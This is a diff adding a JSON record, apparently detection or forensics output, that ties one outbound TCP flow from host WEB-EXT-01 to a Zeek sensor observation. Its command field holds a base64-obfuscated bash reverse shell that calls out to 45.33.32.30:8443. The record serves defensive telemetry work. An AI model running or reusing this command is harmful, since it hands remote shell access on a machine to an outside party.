@@ -1,0 +1,29 @@
+{
+  "raw_tcp_flows": 1,
+  "joined_sensor_observations": 1,
+  "tls_contradictions": 0,
+  "flows": [
+    {
+      "host": "WEB-EXT-01",
+      "actor_id": "9420c3c3-732c-4b41-873a-5a42a7d3150a",
+      "pid": 2702806,
+      "time": 1793629203.045,
+      "tuple": [
+        "10.10.3.10",
+        56738,
+        "45.33.32.30",
+        8443
+      ],
+      "command": "bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'",
+      "sensor_observations": [
+        {
+          "sensor": "zeek-dmz",
+          "uid": "CgR5Lvle5WdWRKjoSq",
+          "service": null,
+          "has_ssl": false,
+          "established_tls": null
+        }
+      ]
+    }
+  ]
+}
